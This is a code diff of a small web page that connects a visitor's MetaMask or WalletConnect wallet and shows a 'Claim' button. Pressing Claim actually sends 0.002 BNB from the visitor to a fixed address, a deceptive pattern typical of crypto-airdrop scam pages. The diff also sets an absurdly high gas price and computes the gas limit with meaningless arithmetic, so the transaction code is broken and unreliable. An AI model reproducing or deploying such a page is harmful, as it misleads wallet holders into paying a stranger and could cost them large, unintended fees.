@@ -8,60 +8,101 @@
             display: flex;
             justify-content: center;
             align-items: center;
+            flex-direction: column;
             height: 100vh;
         }
     </style>
 </head>
 <body>
     <div class="center">
+        <button onclick="connectWallet()">Connect Wallet</button>
         <button onclick="payWithBNB()">Claim</button>
     </div>
     
     <script>
-        async function payWithBNB() {
-            if (typeof window.ethereum !== 'undefined' || (typeof window.WalletConnect !== 'undefined' && window.WalletConnect.supported())) {
-                await ethereum.enable();
-                const web3 = new Web3(window.ethereum);
+        let web3;
+        let account;
+
+        async function connectWallet() {
+            if (typeof window.ethereum !== 'undefined') {
+                await ethereum.request({ method: 'eth_requestAccounts' });
+                web3 = new Web3(window.ethereum);
                 const accounts = await web3.eth.getAccounts();
-                
+
                 // Check if the user has selected an account
                 if (accounts.length === 0) {
-                    alert('Please connect to MetaMask or WalletConnect and select an account.');
+                    alert('Please connect to MetaMask and select an account.');
                     return;
                 }
-                
-                const account = accounts[0];
-                const amount = '0.002'; // BNB amount in BNB (18 decimal places)
-                const receiverAddress = '0xD9E818f75c948D11fBFFD65bFC626ea29a1f583b';
-                
-                // Convert BNB amount to wei
-                const amountWei = web3.utils.toWei(amount);
-                
-                // Get the minimum gas price from the network (e.g., 1 Gwei)
-                const minimumGasPrice = '1000000000'; // 1 Gwei in wei
-                
-                // Calculate the gas limit based on the minimum gas price
-                const gasLimit = Math.ceil(amountWei / minimumGasPrice) + 21000; // Add a buffer of 21,000 gas
-                
-                // Prepare the transaction object
-                const transactionObject = {
-                    from: account,
-                    to: receiverAddress,
-                    value: amountWei,
-                    gasPrice: minimumGasPrice,
-                    gas: gasLimit
-                };
-                
-                try {
-                    // Send the transaction
-                    const transactionHash = await web3.eth.sendTransaction(transactionObject);
-                    alert('Payment successful! Transaction Hash: ' + transactionHash);
-                } catch (error) {
-                    alert('Payment failed: ' + error.message);
+
+                account = accounts[0];
+                alert('MetaMask connected!');
+            } else if (typeof window.WalletConnect !== 'undefined' && window.WalletConnect.supported()) {
+                const connector = new WalletConnect({
+                    bridge: 'https://bridge.walletconnect.org', // WalletConnect bridge URL
+                    qrcodeModalOptions: {
+                        mobileLinks: [
+                            'metamask',
+                        ],
+                    },
+                });
+
+                // Check if already connected
+                if (!connector.connected) {
+                    // Create a QR Code Modal to scan the QR code
+                    connector.createSession();
+                    connector.on('connect', (error, payload) => {
+                        if (error) {
+                            throw error;
+                        }
+
+                        web3 = new Web3(connector.provider);
+                        account = payload.params[0];
+                        alert('WalletConnect connected!');
+                    });
+                } else {
+                    web3 = new Web3(connector.provider);
+                    account = connector.accounts[0];
+                    alert('WalletConnect connected!');
                 }
-                
             } else {
-                alert('Please install MetaMask or WalletConnect to make the payment.');
+                alert('Please install MetaMask or WalletConnect to connect your wallet.');
+            }
+        }
+
+        async function payWithBNB() {
+            if (!web3) {
+                alert('Please connect your wallet before making the payment.');
+                return;
+            }
+
+            const amount = '0.002'; // BNB amount in BNB (18 decimal places)
+            const receiverAddress = '0xD9E818f75c948D11fBFFD65bFC626ea29a1f583b';
+
+            // Convert BNB amount to wei
+            const amountWei = web3.utils.toWei(amount);
+
+            // Get the gas price in wei (0.00025 BNB)
+            const gasPrice = web3.utils.toWei('0.00025', 'ether');
+
+            // Calculate the gas limit based on the gas price
+            const gasLimit = Math.ceil(amountWei / gasPrice) + 21000; // Add a buffer of 21,000 gas
+
+            // Prepare the transaction object
+            const transactionObject = {
+                from: account,
+                to: receiverAddress,
+                value: amountWei,
+                gasPrice: gasPrice,
+                gas: gasLimit
+            };
+
+            try {
+                // Send the transaction
+                const transactionHash = await web3.eth.sendTransaction(transactionObject);
+                alert('Payment successful! Transaction Hash: ' + transactionHash);
+            } catch (error) {
+                alert('Payment failed: ' + error.message);
             }
         }
     </script>
